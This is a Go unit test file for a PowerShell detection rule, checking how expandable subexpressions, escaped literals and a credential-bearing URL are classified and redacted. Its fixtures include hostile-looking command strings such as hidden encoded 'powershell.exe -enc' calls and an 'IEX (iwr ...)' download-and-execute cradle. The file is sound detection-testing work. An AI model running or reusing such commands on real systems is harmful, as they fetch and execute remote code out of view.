package detect

import (
	"strings"
	"testing"
	"tracefall/internal/model"
)

func TestExpandableSubexpressionUncertainLead(t *testing.T) {
	for i, cmd := range []string{
		`Write-Output "$(IEX $s)"`,
		`Write-Output "$(powershell.exe -w hidden -enc AAAA)"`,
		"Write-Output \"``$(IEX $s)\"",
		`Write-Output "$(IEX ('nested'))"`,
		`Write-Output "$(IEX $s`,
		`Write-Output "$(IEX $s"`,
	} {
		labels, _, state := classifiedPowerShellEvidence(cmd, true)
		if state != invocationUncertain || len(labels) != 0 {
			t.Errorf("expression control %d must remain unresolved", i)
		}
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: cmd}})
		if len(fs) != 1 || fs[0].Severity != "low" || fs[0].Confidence != "low" || !strings.Contains(fs[0].Description, "uncertain") {
			t.Errorf("expression control %d lost conservative low/low lead", i)
		}
	}
}

func TestExpandableSubexpressionLiteralControls(t *testing.T) {
	for i, cmd := range []string{
		`Write-Output '$(IEX $s)'`,
		"Write-Output \"`$(IEX $s)\"",
		"Write-Output \"```$(IEX $s)\"",
		`Write-Output "IEX $s"`,
		`Write-Output '$(powershell.exe -w hidden -enc AAAA)'`,
		"Write-Output \"`$(powershell.exe -w hidden -enc AAAA)\"",
		`Write-Output "$(Get-Date)"`,
		`Write-Output "$(ordinaryExpression"`,
	} {
		fs := (powershellEncodedCommand{}).Evaluate([]model.Event{{ID: "e", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: cmd}})
		if len(fs) != 0 {
			t.Errorf("literal/non-baseline control %d selected", i)
		}
	}
}

func TestApostropheUserinfoFindingRedactedOriginalPreserved(t *testing.T) {
	cmd := `IEX (iwr "https://alice:Dummy'Secret42@host01/a")`
	events := []model.Event{{ID: "e", CaseID: "c", EventType: model.EventPowerShellScript, CommandLine: cmd}}
	fs := (powershellEncodedCommand{}).Evaluate(events)
	if len(fs) != 1 {
		t.Fatal("supported invocation lost")
	}
	if strings.Contains(fs[0].Description, "Dummy") || strings.Contains(fs[0].Description, "Secret42") || !strings.Contains(fs[0].Description, "<redacted>@host01") {
		t.Fatal("userinfo leak or damaged host")
	}
	if events[0].CommandLine != cmd {
		t.Fatal("original command mutated")
	}
}
